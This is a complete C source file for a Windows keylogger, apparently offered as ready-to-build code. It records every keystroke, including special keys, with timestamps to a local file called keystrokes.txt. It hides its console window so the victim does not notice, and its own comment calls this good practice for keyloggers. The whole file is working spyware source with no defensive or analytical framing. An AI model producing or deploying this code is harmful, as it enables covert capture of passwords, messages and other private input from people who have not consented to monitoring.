#include <stdio.h>
#include <windows.h>
#include <ctype.h>
#include <time.h>
#include <stdbool.h>
#include <errno.h>

#define LOG_FILE "keystrokes.txt"
#define TIMESTAMP_FORMAT "%Y-%m-%d %H:%M:%S"
#define MAX_TIMESTAMP_LENGTH 20
#define NUM_KEYS 256

// Function to get the current timestamp
bool get_timestamp(char *timestamp, size_t timestamp_size) {
    time_t rawtime;
    struct tm timeinfo; // Use a local struct tm
    errno_t err;

    time(&rawtime);
    err = localtime_s(&timeinfo, &rawtime); // Use localtime_s for security

    if (err != 0) {
        fprintf(stderr, "Error: localtime_s failed with error code %d.\n", err);
        timestamp[0] = '\0';
        return false;
    }

    if (strftime(timestamp, timestamp_size, TIMESTAMP_FORMAT, &timeinfo) == 0) {
        fprintf(stderr, "Error: Timestamp buffer too small.\n");
        timestamp[0] = '\0'; // Ensure null termination in case of error
        return false;
    }
    return true;
}

bool log_keystroke(int key) {
    FILE *file;
    errno_t err = fopen_s(&file, LOG_FILE, "a"); // Use fopen_s for security
    if (err != 0 || file == NULL) {
        fprintf(stderr, "Error opening %s: %s\n", LOG_FILE, strerror(err));
        return false;
    }

    char timestamp[MAX_TIMESTAMP_LENGTH];
    if (!get_timestamp(timestamp, sizeof(timestamp))) {
        fclose(file);
        return false;
    }

    fprintf(file, "[%s] ", timestamp);

    // Handle special keys and printable characters
    switch (key) {
        case VK_SPACE:
            fprintf(file, " ");
            break;
        case VK_RETURN:
            fprintf(file, "\n");
            break;
        case VK_TAB:
            fprintf(file, "\t");
            break;
        case VK_BACK:
            fprintf(file, "[BACKSPACE]");
            break;
        case VK_SHIFT:
            fprintf(file, "[SHIFT]");
            break;
        case VK_CONTROL:
            fprintf(file, "[CTRL]");
            break;
        case VK_MENU:
            fprintf(file, "[ALT]");
            break;
        default:
            if (isprint(key)) { // Use isprint for better character handling
                fprintf(file, "%c", (char)key);
            } else {
                fprintf(file, "[KEY:%d]", key); // Log the key code if not handled
            }
            break;
    }

    fprintf(file, "\n");
    if (fclose(file) == EOF) {
        perror("Error closing keystrokes.txt");
        return false;
    }
    return true;
}

int main() {
    int key;
    // Hide the console window (optional, but good practice for keyloggers)
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);

    // Debouncing mechanism
    bool key_pressed[NUM_KEYS] = {false}; // Array to track key states

    while (1) {
        for (key = 1; key < NUM_KEYS; key++) {
            if (GetAsyncKeyState(key) & 0x8000) {
                if (!key_pressed[key]) { // Only log if the key wasn't already pressed
                    if (!log_keystroke(key)) {
                        // Handle logging failure (e.g., retry, exit)
                        fprintf(stderr, "Error logging keystroke for key %d\n", key);
                    }
                    key_pressed[key] = true; // Mark the key as pressed
                }
            } else {
                key_pressed[key] = false; // Reset the key state when released
            }
        }
        Sleep(1); // Reduce CPU usage
    }
    return 0;
}